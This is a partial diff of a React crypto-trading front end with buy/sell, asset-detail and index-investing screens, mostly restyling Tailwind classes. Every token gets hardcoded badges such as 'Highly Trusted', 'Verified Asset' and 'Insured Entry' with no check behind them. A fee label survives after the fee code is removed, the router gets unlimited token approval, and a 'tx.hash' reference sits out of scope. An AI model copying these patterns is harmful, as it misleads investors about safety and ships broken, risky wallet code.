+                                <select value={tab === 'buy' ? cryptoAsset : fiatCurrency} onChange={(e) => tab === 'buy' ? setCryptoAsset(e.target.value) : setFiatCurrency(e.target.value)} className="w-32 bg-slate-50 border border-slate-200/60 rounded-2xl px-4 py-5 font-black text-sm outline-none focus:bg-white focus:border-emerald-500/30">
                                     {tab === 'buy' ? Object.keys(cryptoRates).map(c => <option key={c} value={c}>{c}</option>) : Object.keys(rates).map(c => <option key={c} value={c}>{c}</option>)}
                                 </select>
                             </div>
@@ -2967,7 +3275,7 @@ const FiatPortal = () => {
                         </p>
                     </div>
 
-                    <button type="submit" className={`w-full py-6 text-white font-black text-lg rounded-[2.5rem] mt-4 transition-all shadow-xl hover:scale-[1.02] active:scale-95 ${tab === 'buy' ? 'bg-emerald-500 hover:bg-emerald-600 shadow-emerald-500/20' : 'bg-rose-500 hover:bg-rose-600 shadow-rose-500/20'}`}>
+                    <button type="submit" className={`w-full py-6 text-white font-black text-lg rounded-2xl mt-4 transition-all shadow-xl hover:scale-[1.02] active:scale-95 ${tab === 'buy' ? 'bg-emerald-500 hover:bg-emerald-600 shadow-emerald-500/20' : 'bg-rose-500 hover:bg-rose-600 shadow-rose-500/20'}`}>
                         {tab === 'buy' ? `Complete Buy Order` : `Liquidate to Fiat`}
                     </button>
                 </form>
@@ -2983,14 +3291,14 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
         <motion.div 
             initial={{ opacity: 0, scale: 0.98 }}
             animate={{ opacity: 1, scale: 1 }}
-            className="bg-white shadow-3xl shadow-amber-900/5 border border-gray-100 rounded-[3rem] overflow-hidden flex flex-col sticky top-32"
+            className="bg-white shadow-xl shadow-slate-200/50 border border-slate-100 rounded-3xl overflow-hidden flex flex-col sticky top-32"
         >
             {/* On-Chain Asset Intelligence Header */}
             <div className="bg-gray-900 p-8 text-white">
                 <div className="flex items-center justify-between mb-6">
                     <div>
-                        <h4 className="text-[10px] font-black text-amber-500 uppercase tracking-[0.4em] mb-1">On-Chain Asset Intelligence</h4>
-                        <h3 className="text-xl font-black uppercase tracking-tighter">{token.name} — Live Surveillance</h3>
+                        <h4 className="text-[10px] font-black text-indigo-600 uppercase tracking-widest mb-1">On-Chain Asset Intelligence</h4>
+                        <h3 className="text-xl font-bold uppercase tracking-tighter">{token.name} — Live Surveillance</h3>
                     </div>
                     <div className="flex items-center gap-2 px-3 py-1.5 bg-emerald-500/10 border border-emerald-500/20 rounded-xl">
                         <div className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse" />
@@ -3018,27 +3326,27 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
             <div className="p-8 space-y-10">
                 {/* Identity Section */}
                 <div className="flex items-center gap-6">
-                    <div className="w-28 h-28 bg-gray-50 rounded-[2rem] p-3 border border-gray-100 shadow-inner relative group shrink-0">
+                    <div className="w-28 h-28 bg-slate-50 rounded-[2rem] p-3 border border-slate-200/60 shadow-inner relative group shrink-0">
                         {token.image ? <img src={token.image} className="w-full h-full object-contain rounded-xl group-hover:scale-110 transition-transform duration-500" alt="" /> : null}
                         <div className="absolute -bottom-2 -right-2 w-8 h-8 bg-emerald-500 rounded-xl flex items-center justify-center text-sm text-white font-black border-2 border-white shadow-lg">✓</div>
                     </div>
                     <div>
                         <div className="flex items-center gap-2 mb-1">
                             <span className="text-[9px] font-black text-rose-500 uppercase tracking-widest bg-rose-50 px-2 py-0.5 rounded">Highly Trusted</span>
-                            <span className="text-[9px] font-black text-amber-500 uppercase tracking-widest bg-amber-50 px-2 py-0.5 rounded">{token.network || 'BNB'} Chain</span>
+                            <span className="text-[9px] font-black text-indigo-600 uppercase tracking-widest bg-indigo-50 px-2 py-0.5 rounded">{token.network || 'BNB'} Chain</span>
                         </div>
-                        <h3 className="text-3xl font-black text-gray-900 uppercase tracking-tighter leading-none">{token.name}</h3>
-                        <p className="text-sm font-black text-gray-400 uppercase tracking-[0.2em] mt-2">${token.symbol}</p>
+                        <h3 className="text-3xl font-black text-slate-900 uppercase tracking-tighter leading-none">{token.name}</h3>
+                        <p className="text-sm font-black text-slate-400 uppercase tracking-wide mt-2">${token.symbol}</p>
                     </div>
                 </div>
 
                 <div className="grid grid-cols-2 gap-4">
-                    <div className="p-5 bg-gray-50 rounded-2xl border border-gray-100">
-                        <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1">Current Price</p>
-                        <p className="text-xl font-black text-gray-900 tracking-tight">${token.current_price?.toLocaleString() || '0.00'}</p>
+                    <div className="p-5 bg-slate-50 rounded-2xl border border-slate-200/60">
+                        <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1">Current Price</p>
+                        <p className="text-xl font-black text-slate-900 tracking-tight">${token.current_price?.toLocaleString() || '0.00'}</p>
                     </div>
                     <div className="p-5 bg-gray-900 rounded-2xl border border-gray-800 text-white shadow-xl shadow-gray-900/10">
-                        <p className="text-[9px] font-black text-gray-500 uppercase tracking-widest mb-1 underline decoration-amber-500">Market Cap Rank</p>
+                        <p className="text-[9px] font-black text-gray-500 uppercase tracking-widest mb-1 underline decoration-indigo-500">Market Cap Rank</p>
                         <p className="text-xl font-black tracking-tight italic">GLOBAL #{token.market_cap_rank || '---'}</p>
                     </div>
                 </div>
@@ -3046,31 +3354,31 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
                 {/* TECHNICAL IDENTIFICATION */}
                 <div className="space-y-4">
                     <div className="flex items-center justify-between">
-                        <h5 className="text-[10px] font-black text-gray-900 uppercase tracking-[0.2em]">Technical Identification</h5>
-                        <div className="px-2 py-1 bg-amber-50 text-amber-600 rounded text-[8px] font-black uppercase">Live Scan Active</div>
+                        <h5 className="text-[10px] font-black text-slate-900 uppercase tracking-wide">Technical Identification</h5>
+                        <div className="px-2 py-1 bg-indigo-50 text-indigo-600 rounded text-[8px] font-bold uppercase">Live Scan Active</div>
                     </div>
                     <div className="grid grid-cols-1 gap-2">
-                        <div className="flex items-center justify-between p-4 bg-gray-50 border border-black/5 rounded-2xl">
-                            <span className="text-[10px] font-black text-gray-400 uppercase">Contract ID</span>
+                        <div className="flex items-center justify-between p-4 bg-slate-50 border border-black/5 rounded-2xl">
+                            <span className="text-[10px] font-black text-slate-400 uppercase">Contract ID</span>
                             <div className="flex items-center gap-3">
-                                <span className="font-mono text-[10px] text-gray-900">{(token.address || token.id)?.slice(0, 8)}...{(token.address || token.id)?.slice(-8)}</span>
+                                <span className="font-mono text-[10px] text-slate-900">{(token.address || token.id)?.slice(0, 8)}...{(token.address || token.id)?.slice(-8)}</span>
                                 <CopyButton text={token.address || token.id} />
                             </div>
                         </div>
                         <div className="grid grid-cols-2 gap-2">
                             {[
-                                { l: 'Ecosystem', v: token.network || 'BNB', c: 'text-amber-500' },
+                                { l: 'Ecosystem', v: token.network || 'BNB', c: 'text-indigo-600' },
                                 { l: 'Total Supply', v: token.total_supply > 0 ? formatB20Number(token.total_supply, "") : '---', c: 'text-emerald-500' },
                                 { l: 'Market Cap', v: token.market_cap > 0 ? formatB20Number(token.market_cap, "$") : '---', c: 'text-blue-500' },
                                 { l: '24h Volume', v: token.total_volume > 0 ? formatB20Number(token.total_volume, "$") : '---', c: 'text-purple-500' }
                             ].map(x => (
-                                <div key={x.l} className="p-4 bg-gray-50 border border-black/5 rounded-2xl">
-                                    <p className="text-[8px] font-black text-gray-400 uppercase mb-1">{x.l}</p>
-                                    <p className={`text-[10px] font-black uppercase ${x.c}`}>{x.v}</p>
+                                <div key={x.l} className="p-4 bg-slate-50 border border-black/5 rounded-2xl">
+                                    <p className="text-[8px] font-black text-slate-400 uppercase mb-1">{x.l}</p>
+                                    <p className={`text-[10px] font-bold uppercase ${x.c}`}>{x.v}</p>
                                 </div>
                             ))}
                         </div>
-                        <button className="w-full py-4 bg-gray-900 text-white rounded-2xl text-[9px] font-black uppercase tracking-widest flex items-center justify-center gap-2 group transition-all hover:bg-black">
+                        <button className="w-full py-4 bg-gray-900 text-white rounded-2xl text-[9px] font-bold uppercase tracking-widest flex items-center justify-center gap-2 group transition-all hover:bg-black">
                             <Globe className="w-3 h-3 group-hover:rotate-45 transition-transform" /> Open Live Network Scanner
                         </button>
                     </div>
@@ -3078,25 +3386,25 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
 
                 {/* VOLATILITY PULSE */}
                 <div className="space-y-4">
-                    <h5 className="text-[10px] font-black text-gray-900 uppercase tracking-[0.2em]">Market Volatility Pulse</h5>
-                    <div className="p-6 bg-white border border-gray-100 rounded-3xl shadow-sm relative overflow-hidden group">
-                        <div className="absolute top-0 right-0 w-32 h-32 bg-gray-50 rounded-full -mr-16 -mt-16 group-hover:scale-110 transition-transform" />
+                    <h5 className="text-[10px] font-black text-slate-900 uppercase tracking-wide">Market Volatility Pulse</h5>
+                    <div className="p-6 bg-white border border-slate-200/60 rounded-xl shadow-sm relative overflow-hidden group">
+                        <div className="absolute top-0 right-0 w-32 h-32 bg-slate-50 rounded-full -mr-16 -mt-16 group-hover:scale-110 transition-transform" />
                         <div className="relative z-10 grid grid-cols-3 gap-6">
                             <div>
-                                <p className="text-[8px] font-black text-gray-400 uppercase mb-1">24h Delta</p>
-                                <p className={`text-sm font-black font-mono ${token.price_change_percentage_24h !== undefined ? (token.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500') : 'text-gray-400'}`}>
+                                <p className="text-[8px] font-black text-slate-400 uppercase mb-1">24h Delta</p>
+                                <p className={`text-sm font-black font-mono ${token.price_change_percentage_24h !== undefined ? (token.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500') : 'text-slate-400'}`}>
                                     {token.price_change_percentage_24h !== undefined ? `${token.price_change_percentage_24h >= 0 ? '+' : ''}${token.price_change_percentage_24h.toFixed(2)}%` : '---'}
                                 </p>
                             </div>
                             <div>
-                                <p className="text-[8px] font-black text-gray-400 uppercase mb-1">24h High</p>
-                                <p className="text-sm font-black text-gray-900 font-mono">
+                                <p className="text-[8px] font-black text-slate-400 uppercase mb-1">24h High</p>
+                                <p className="text-sm font-black text-slate-900 font-mono">
                                     {token.high_24h > 0 ? `$${token.high_24h < 0.01 ? token.high_24h.toFixed(6) : token.high_24h.toLocaleString()}` : '---'}
                                 </p>
                             </div>
                             <div>
-                                <p className="text-[8px] font-black text-gray-400 uppercase mb-1">24h Low</p>
-                                <p className="text-sm font-black text-gray-900 font-mono">
+                                <p className="text-[8px] font-black text-slate-400 uppercase mb-1">24h Low</p>
+                                <p className="text-sm font-black text-slate-900 font-mono">
                                     {token.low_24h > 0 ? `$${token.low_24h < 0.01 ? token.low_24h.toFixed(6) : token.low_24h.toLocaleString()}` : '---'}
                                 </p>
                             </div>
@@ -3105,18 +3413,18 @@ const AssetDetails = ({ token, setMode, liveTrades = [], globalTickers = [] }) =
                 </div>
 
                 <div className="flex items-center gap-4 pt-4">
-                    <div className="flex-1 p-4 bg-amber-50 border border-amber-100 rounded-2xl flex items-center justify-center gap-3">
-                        <ShieldCheck className="w-4 h-4 text-amber-500" />
-                        <span className="text-[10px] font-black text-amber-600 uppercase tracking-widest">Verified Asset</span>
+                    <div className="flex-1 p-4 bg-indigo-50 border border-indigo-100 rounded-2xl flex items-center justify-center gap-3">
+                        <ShieldCheck className="w-4 h-4 text-indigo-600" />
+                        <span className="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Verified Asset</span>
                     </div>
                 </div>
 
                 {/* Action Footer */}
                 <div className="flex gap-4 pt-4">
-                    <button onClick={() => setMode('fiat')} className="flex-1 py-5 bg-emerald-500 text-white rounded-3xl text-[10px] font-black uppercase tracking-widest shadow-xl shadow-emerald-500/20 hover:bg-emerald-600 transition-all">
+                    <button onClick={() => setMode('fiat')} className="flex-1 py-5 bg-emerald-500 text-white rounded-xl text-[10px] font-bold uppercase tracking-widest shadow-xl shadow-emerald-500/20 hover:bg-emerald-600 transition-all">
                         Buy {token.symbol} Instantly
                     </button>
-                    <button onClick={() => setMode('web3')} className="flex-1 py-5 bg-gray-100 text-gray-900 rounded-3xl text-[10px] font-black uppercase tracking-widest hover:bg-gray-200 transition-all flex items-center justify-center gap-2">
+                    <button onClick={() => setMode('web3')} className="flex-1 py-5 bg-gray-100 text-slate-900 rounded-xl text-[10px] font-bold uppercase tracking-widest hover:bg-gray-200 transition-all flex items-center justify-center gap-2">
                         <Globe className="w-4 h-4" /> Swap Portal
                     </button>
                 </div>
@@ -3331,19 +3639,14 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             const router = new Contract(PANCAKE_ROUTER_ADDRESS, PANCAKE_ROUTER_ABI, signer);
             
             const totalWei = ethers.parseUnits(investAmount, 18);
-            const feeWei = ethers.parseUnits('1', 18);
-            
-            // ── STAGE 1: PROTOCOL FEE & APPROVAL ──────────────────────────
+            // ── STAGE 1: PROTOCOL APPROVAL ──────────────────────────
             const allowance = await usdtContract.allowance(account, PANCAKE_ROUTER_ADDRESS);
             if (allowance < totalWei) {
                 const tx = await usdtContract.approve(PANCAKE_ROUTER_ADDRESS, ethers.MaxUint256);
                 await tx.wait();
             }
             
-            const feeTx = await usdtContract.transfer(FEE_WALLET, feeWei);
-            await feeTx.wait();
-            
-            const tradableAmount = totalWei - feeWei;
+            const tradableAmount = totalWei;
             
             // ── STAGE 2: MULTI-ASSET STRATEGIC EXECUTION ──────────────────
             for (let i = 0; i < bucket.tokens.length; i++) {
@@ -3373,7 +3676,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                     bucket_id: bucket.id,
                     bucket_name: bucket.name,
                     invest_amount: amountNum,
-                    tx_hash: feeTx.hash,
+                    tx_hash: tx.hash || 'auto_swap',
                     bucket_json: bucket.tokens
                 });
             } catch (syncErr) { console.error('Profile sync failed:', syncErr); }
@@ -3447,31 +3750,31 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
     return (
         <div className="space-y-12 pb-24">
             <div className="relative">
-                <div className="bg-white/95 backdrop-blur-3xl rounded-[2.9rem] p-10 md:p-14 relative z-10 flex flex-col md:flex-row items-center gap-12 border border-white/50">
+                <div className="bg-white/95 backdrop-blur-3xl rounded-[2.9rem] p-10 md:p-14 relative z-10 flex flex-col md:flex-row items-center gap-8 border border-white/50">
                     <div className="flex-1 space-y-6">
                         <div className="flex items-center gap-4">
-                            <div className="bg-indigo-600 px-6 py-2 rounded-full text-white text-[10px] font-black uppercase tracking-widest animate-pulse shadow-xl shadow-indigo-500/20">Institutional Alpha Index</div>
-                            <div className="flex items-center gap-2 text-gray-400">
+                            <div className="bg-indigo-600 px-6 py-2 rounded-full text-white text-[10px] font-bold uppercase tracking-widest animate-pulse shadow-xl shadow-indigo-500/20">Institutional Alpha Index</div>
+                            <div className="flex items-center gap-2 text-slate-400">
                                 <ShieldCheck className="w-4 h-4" />
-                                <span className="text-[9px] font-black uppercase tracking-widest text-gray-400">B20 Global Verified</span>
+                                <span className="text-[9px] font-bold uppercase tracking-widest text-slate-400">B20 Global Verified</span>
                             </div>
                         </div>
-                        <h1 className="text-4xl md:text-5xl font-black text-gray-900 uppercase tracking-tighter leading-tight italic">
+                        <h1 className="text-4xl md:text-5xl font-black text-slate-900 uppercase tracking-tighter leading-tight italic">
                             Smart Money <span className="text-indigo-600">Hub</span>
                         </h1>
                         <p className="text-sm font-bold text-gray-500 uppercase leading-relaxed tracking-widest max-w-2xl">
                              Engineered for institutional-grade diversification. Deploy capital across curated "Super 7" indices with weighted distribution algorithm.
                         </p>
                     </div>
-                    <div className="w-full md:w-80 bg-gray-50 rounded-[2.5rem] p-8 border border-gray-100 shadow-inner flex flex-col gap-6">
-                         <div className="flex justify-between items-center bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
+                    <div className="w-full md:w-80 bg-slate-50 rounded-2xl p-8 border border-slate-200/60 shadow-inner flex flex-col gap-6">
+                         <div className="flex justify-between items-center bg-white p-6 rounded-2xl shadow-sm border border-slate-200/60">
                             <div>
-                                <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Global Entry Position ($)</p>
+                                <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Global Entry Position ($)</p>
                                 <input 
                                     type="number" 
                                     value={investAmount} 
                                     onChange={e => setInvestAmount(e.target.value)}
-                                    className="bg-transparent text-2xl font-black text-gray-900 outline-none w-full mt-1"
+                                    className="bg-transparent text-2xl font-black text-slate-900 outline-none w-full mt-1"
                                 />
                             </div>
                             <span className="text-xs font-black text-indigo-600">USDT</span>
@@ -3481,12 +3784,12 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             </div>
 
             <div className="flex justify-center">
-                <div className="bg-white border border-gray-100 rounded-[2rem] p-3 flex gap-2 shadow-2xl shadow-indigo-500/5 max-w-full overflow-x-auto">
+                <div className="bg-white border border-slate-200/60 rounded-[2rem] p-3 flex gap-2 shadow-2xl shadow-indigo-500/5 max-w-full overflow-x-auto">
                     {['crypto', 'meme', 'bnb', 'eth', 'sol', 'base', 'custom'].map(cat => (
                         <button 
                             key={cat}
                             onClick={() => setSelectedCategory(cat)}
-                            className={`px-10 py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all whitespace-nowrap ${selectedCategory === cat ? 'bg-indigo-600 text-white shadow-xl shadow-indigo-500/20' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-10 py-4 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all whitespace-nowrap ${selectedCategory === cat ? 'bg-indigo-600 text-white shadow-xl shadow-indigo-500/20' : 'text-slate-400 hover:text-slate-900 hover:bg-slate-50'}`}
                         >
                             {cat} Strategic Pool
                         </button>
@@ -3497,10 +3800,10 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
                 {selectedCategory !== 'custom' ? (
                     SMART_MONEY_BUCKETS[selectedCategory].map(bucket => (
-                        <div key={bucket.id} className="bg-white border border-gray-100 rounded-[3rem] p-10 flex flex-col gap-8 group hover:border-indigo-500/30 transition-all duration-500 shadow-3xl hover:shadow-[0_60px_100px_-20px_rgba(79,70,229,0.1)] relative overflow-hidden flex flex-col">
+                        <div key={bucket.id} className="bg-white border border-slate-200/60 rounded-2xl p-10 flex flex-col gap-8 group hover:border-indigo-500/30 transition-all duration-500 shadow-3xl hover:shadow-[0_60px_100px_-20px_rgba(79,70,229,0.1)] relative overflow-hidden flex flex-col">
                             <div className="flex items-center justify-between">
                                 <div className="space-y-1">
-                                    <h3 className="text-2xl font-black text-gray-900 uppercase tracking-tighter transition-colors group-hover:text-indigo-600 italic">{bucket.name}</h3>
+                                    <h3 className="text-2xl font-black text-slate-900 uppercase tracking-tighter transition-colors group-hover:text-indigo-600 italic">{bucket.name}</h3>
                                     <p className="text-[10px] font-black text-indigo-500 uppercase tracking-widest flex items-center gap-2">
                                         <Layers className="w-3 h-3" /> Weighted Suggestions
                                     </p>
@@ -3510,7 +3813,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                 </div>
                             </div>
 
-                            <p className="text-[11px] font-bold text-gray-400 uppercase leading-relaxed tracking-widest min-h-[40px] italic pr-4 border-l-2 border-gray-100 pl-4">
+                            <p className="text-[11px] font-bold text-slate-400 uppercase leading-relaxed tracking-widest min-h-[40px] italic pr-4 border-l-2 border-slate-200/60 pl-4">
                                 "{bucket.description}"
                             </p>
 
@@ -3519,9 +3822,9 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                     const display = getTokenDisplay(token);
                                     const weight = STRATEGIC_WEIGHTS[idx] || 10;
                                     return (
-                                        <div key={token.symbol} className="p-4 bg-gray-50 border border-gray-100 rounded-2xl flex items-center justify-between hover:bg-white hover:shadow-xl transition-all border border-transparent hover:border-indigo-100">
+                                        <div key={token.symbol} className="p-4 bg-slate-50 border border-slate-200/60 rounded-2xl flex items-center justify-between hover:bg-white hover:shadow-xl transition-all border border-transparent hover:border-indigo-100">
                                             <div className="flex items-center gap-4">
-                                                <div className="w-10 h-10 bg-white p-1.5 rounded-xl shadow-sm border border-gray-100 flex items-center justify-center">
+                                                <div className="w-10 h-10 bg-white p-1.5 rounded-xl shadow-sm border border-slate-200/60 flex items-center justify-center">
                                                     {display.image ? (
                                                         <img 
                                                             src={display.image} 
@@ -3538,14 +3841,14 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                                 </div>
                                                 <div>
                                                     <div className="flex items-center gap-2">
-                                                        <p className="text-xs font-black text-gray-900 leading-none">{token.symbol}</p>
+                                                        <p className="text-xs font-black text-slate-900 leading-none">{token.symbol}</p>
                                                         <span className="text-[8px] font-black text-emerald-600 bg-white px-2 py-0.5 rounded border border-emerald-100 shadow-sm">{weight}%</span>
                                                     </div>
-                                                    <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest mt-1.5 truncate max-w-[80px]">{display.name}</p>
+                                                    <p className="text-[8px] font-black text-slate-400 uppercase tracking-widest mt-1.5 truncate max-w-[80px]">{display.name}</p>
                                                 </div>
                                             </div>
                                             <div className="text-right">
-                                                <p className="text-[10px] font-black text-gray-900 uppercase tracking-widest bg-gray-100/50 px-3 py-1.5 rounded-lg border border-gray-100">
+                                                <p className="text-[10px] font-black text-slate-900 uppercase tracking-widest bg-gray-100/50 px-3 py-1.5 rounded-lg border border-slate-200/60">
                                                     ${((parseFloat(investAmount) || 0) * (weight / 100)).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                                                 </p>
                                             </div>
@@ -3558,91 +3861,91 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                 <button 
                                     onClick={() => handleInvest(bucket)}
                                     disabled={status === 'loading'}
-                                    className="w-full py-6 bg-gray-900 text-white rounded-[2rem] text-[11px] font-black uppercase tracking-[0.25em] shadow-2xl hover:bg-indigo-600 transition-all flex items-center justify-center gap-3 active:scale-95 group/btn"
+                                    className="w-full py-6 bg-gray-900 text-white rounded-[2rem] text-[11px] font-bold uppercase tracking-[0.25em] shadow-2xl hover:bg-indigo-600 transition-all flex items-center justify-center gap-3 active:scale-95 group/btn"
                                 >
                                     {status === 'loading' ? <Loader2 className="w-5 h-5 animate-spin" /> : <>Execute Strategic Trade <Zap className="w-4 h-4 ml-2 fill-white animate-pulse" /></>}
                                 </button>
                                 <div className="flex justify-between items-center px-6 mt-4">
-                                    <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Protocol Fee: $1.00 USDT</span>
+                                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Protocol Fee: $1.00 USDT</span>
                                     <span className="text-[9px] font-black text-emerald-500 uppercase tracking-widest flex items-center gap-1"><CheckCircle2 className="w-3 h-3" /> Insured Entry</span>
                                 </div>
                             </div>
                         </div>
                     ))
                 ) : (
-                    <div className="lg:col-span-3 bg-white border border-gray-100 rounded-[3rem] p-12 md:p-20 shadow-3xl flex flex-col items-center justify-center gap-10 min-h-[500px] text-center border-t-8 border-indigo-500/20">
+                    <div className="lg:col-span-3 bg-white border border-slate-200/60 rounded-2xl p-8 md:p-20 shadow-3xl flex flex-col items-center justify-center gap-10 min-h-[500px] text-center border-t-8 border-indigo-500/20">
                         {!customBucket.isBuilding ? (
                             <div className="space-y-10">
-                                <div className="w-28 h-28 bg-indigo-50 rounded-[3rem] flex items-center justify-center text-indigo-400 border border-indigo-100 shadow-inner mx-auto relative">
+                                <div className="w-28 h-28 bg-indigo-50 rounded-2xl flex items-center justify-center text-indigo-400 border border-indigo-100 shadow-inner mx-auto relative">
                                     <div className="absolute -top-2 -right-2 w-10 h-10 bg-indigo-500 rounded-full flex items-center justify-center text-white text-xl font-bold shadow-xl border-4 border-white">+</div>
                                     <Sparkles className="w-12 h-12" />
                                 </div>
                                 <div className="space-y-4 max-w-xl">
-                                    <h3 className="text-4xl font-black text-gray-900 uppercase tracking-tighter italic">B20 Custom Alpha Protocol</h3>
-                                    <p className="text-sm font-bold text-gray-400 uppercase tracking-[0.25em] leading-relaxed">
+                                    <h3 className="text-4xl font-black text-slate-900 uppercase tracking-tighter italic">B20 Custom Alpha Protocol</h3>
+                                    <p className="text-sm font-bold text-slate-400 uppercase tracking-[0.25em] leading-relaxed">
                                         Architect your proprietary index. Choose up to 7 global assets, optimize weights, and execute a unified trade mission.
                                     </p>
                                 </div>
-                                <button onClick={() => setCustomBucket({ ...customBucket, isBuilding: true, tokens: [] })} className="px-16 py-6 bg-indigo-600 text-white rounded-[2rem] text-xs font-black uppercase tracking-[0.3em] shadow-2xl shadow-indigo-600/30 hover:scale-105 active:scale-95 transition-all">
+                                <button onClick={() => setCustomBucket({ ...customBucket, isBuilding: true, tokens: [] })} className="px-16 py-6 bg-indigo-600 text-white rounded-[2rem] text-xs font-bold uppercase tracking-wider shadow-2xl shadow-indigo-600/30 hover:scale-105 active:scale-95 transition-all">
                                     Initialize Strategic Builder
                                 </button>
                             </div>
                         ) : (
                             <div className="w-full grid grid-cols-1 md:grid-cols-2 gap-16 animate-in fade-in slide-in-from-bottom-8 duration-700 text-left">
                                 <div className="space-y-8">
-                                    <div className="flex items-center gap-5 border-b border-gray-100 pb-8">
+                                    <div className="flex items-center gap-5 border-b border-slate-200/60 pb-8">
                                         <div className="w-14 h-14 bg-indigo-600 text-white rounded-2xl flex items-center justify-center shadow-2xl shadow-indigo-500/30">
                                             <LayoutGrid className="w-6 h-6" />
                                         </div>
                                         <div>
                                             <p className="text-[10px] font-black text-indigo-500 uppercase tracking-widest leading-none">Strategic Mission Config</p>
-                                            <h4 className="text-2xl font-black text-gray-900 uppercase tracking-tighter mt-2 italic text-left">Custom Bucket Blueprint</h4>
+                                            <h4 className="text-2xl font-black text-slate-900 uppercase tracking-tighter mt-2 italic text-left">Custom Bucket Blueprint</h4>
                                         </div>
                                     </div>
                                     
                                     <div className="space-y-8">
                                         <div>
-                                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 block ml-2">Bucket Identifier</label>
+                                            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4 block ml-2">Bucket Identifier</label>
                                             <input 
                                                 type="text" 
                                                 placeholder="e.g. ALPHA_TERMINAL_01"
                                                 value={customBucket.name}
                                                 onChange={e => setCustomBucket({ ...customBucket, name: e.target.value })}
-                                                className="w-full bg-gray-50 border border-gray-200 rounded-3xl px-8 py-6 font-black text-sm outline-none focus:bg-white focus:border-indigo-500/30 transition-all shadow-sm"
+                                                className="w-full bg-slate-50 border border-gray-200 rounded-xl px-8 py-6 font-black text-sm outline-none focus:bg-white focus:border-indigo-500/30 transition-all shadow-sm"
                                             />
                                         </div>
 
                                         <div>
-                                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 block ml-2">Target Network</label>
+                                            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4 block ml-2">Target Network</label>
                                             <div className="flex flex-wrap gap-2">
                                                 {NETWORKS_LIST.map(net => (
                                                     <button 
                                                         key={net}
                                                         onClick={() => setCustomBucket({ ...customBucket, network: net, tokens: [] })}
-                                                        className={`px-5 py-3 rounded-2xl text-[10px] font-black uppercase tracking-widest transition-all ${customBucket.network === net ? 'bg-indigo-600 text-white shadow-lg' : 'bg-gray-50 text-gray-400 hover:text-gray-900 border border-gray-100'}`}
+                                                        className={`px-5 py-3 rounded-2xl text-[10px] font-bold uppercase tracking-widest transition-all ${customBucket.network === net ? 'bg-indigo-600 text-white shadow-lg' : 'bg-slate-50 text-slate-400 hover:text-slate-900 border border-slate-200/60'}`}
                                                     >
                                                         {net}
                                                     </button>
                                                 ))}
                                             </div>
-                                            <p className="text-[8px] font-bold text-gray-400 mt-3 uppercase tracking-widest ml-1 italic">Selecting a new network will reset the current blueprint</p>
+                                            <p className="text-[8px] font-bold text-slate-400 mt-3 uppercase tracking-widest ml-1 italic">Selecting a new network will reset the current blueprint</p>
                                         </div>
 
                                         <button 
                                             onClick={() => handleInvest(customBucket)}
                                             disabled={status === 'loading' || customBucket.tokens.length === 0}
-                                            className="w-full py-8 bg-indigo-600 text-white rounded-[2.5rem] text-[11px] font-black uppercase tracking-[0.3em] shadow-2xl shadow-indigo-600/20 hover:bg-indigo-700 transition-all flex items-center justify-center gap-4 disabled:opacity-50 h-[90px] mt-10 active:scale-95"
+                                            className="w-full py-8 bg-indigo-600 text-white rounded-2xl text-[11px] font-bold uppercase tracking-wider shadow-lg shadow-indigo-500/20 hover:bg-indigo-700 transition-all flex items-center justify-center gap-4 disabled:opacity-50 h-[90px] mt-10 active:scale-95"
                                         >
                                             {status === 'loading' ? <Loader2 className="w-6 h-6 animate-spin" /> : <>Launch Trade Mission <Rocket className="w-5 h-5 ml-2 fill-white animate-bounce" /></>}
                                         </button>
                                         
-                                        <button onClick={() => setCustomBucket({ ...customBucket, isBuilding: false })} className="w-full text-[10px] font-black text-gray-400 uppercase tracking-widest hover:text-rose-500 transition-colors py-4">Terminate Config</button>
+                                        <button onClick={() => setCustomBucket({ ...customBucket, isBuilding: false })} className="w-full text-[10px] font-black text-slate-400 uppercase tracking-widest hover:text-rose-500 transition-colors py-4">Terminate Config</button>
                                     </div>
                                 </div>
 
-                                <div className="space-y-6 bg-gray-50/50 p-10 rounded-[4rem] border border-gray-100 shadow-inner">
+                                <div className="space-y-6 bg-slate-50/50 p-10 rounded-[4rem] border border-slate-200/60 shadow-inner">
                                     <div className="flex items-center justify-between mb-4">
-                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Selected Assets ({customBucket.tokens.length}/7)</p>
+                                        <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Selected Assets ({customBucket.tokens.length}/7)</p>
